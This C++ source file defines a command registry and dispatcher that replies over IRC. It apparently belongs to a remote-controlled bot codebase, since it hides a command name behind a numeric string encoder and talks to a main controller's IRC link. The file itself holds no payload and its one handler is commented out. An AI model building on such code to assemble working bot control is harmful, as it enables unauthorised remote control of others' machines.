#include "main.h"
#include "commands.h"
#include "mainctrl.h"

CCommands::CCommands()
{	
//	RegisterCommand(&m_cmdList, dp(2,15,20,78,3,15,13,13,1,14,4,19,0).CStr(), this); 
}

void CCommands::RegisterCommand(command *pCommand, const char *szName, CCommandHandler *pHandler)
{	
	pCommand->sName.Assign(szName); 
	pCommand->pHandler=pHandler; 
	m_lCommands.push_back(pCommand); 
}

command *CCommands::FindCommandByName(const char *szName, bool bExact)
{	list<command*>::iterator ic;
	for(ic=m_lCommands.begin(); ic!=m_lCommands.end(); ++ic)
		if(!(*ic)->sName.Compare(szName)) return (*ic);
	return NULL; 
}

bool CCommands::HandleCommand(CMessage *pMsg)
{	
	/*if(!pMsg->sCmd.Compare(m_cmdList.sName.Str()))
	{
		g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "//START:List/", pMsg->sReplyTo.Str());
		list<command*>::iterator ic; int iCount=0;
		for(ic=m_lCommands.begin(); ic!=m_lCommands.end(); ++ic)
		{	
			iCount++; CString sReply; sReply.Format("%d. :: \"%s\" :: \"%s\"", \
				iCount, (*ic)->sName.CStr(), (*ic)->sDescription.CStr());
			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
			Sleep(500); 
		}
		return true;
	}*/
	return false; 
}
